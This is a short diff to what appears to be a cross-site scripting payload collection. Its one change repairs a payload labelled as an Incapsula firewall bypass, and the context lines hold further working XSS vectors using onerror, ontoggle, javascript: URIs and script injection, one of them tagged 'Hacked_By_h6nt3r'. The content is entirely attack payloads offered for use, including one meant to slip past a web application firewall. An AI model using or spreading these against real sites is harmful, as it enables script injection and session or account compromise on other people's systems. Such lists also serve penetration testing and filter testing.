@@ -158,7 +158,7 @@ javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
 \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\ u003e
 <="" script=""><script> alert("Hacked_By_h6nt3r");</script>
 ">'><details/open/ontoggle=confirm('XSS')>
-incapsula bypass: <iframe/onload​="var b ='document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b;this['src']=a">
+incapsula bypass: <iframe/onload="var b ='document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b;this['src']=a">
 ]});</script><script>prompt();</script><!--
 '-alert?.(1)-'
 <​/script><​script>alert(1234)<​/script>
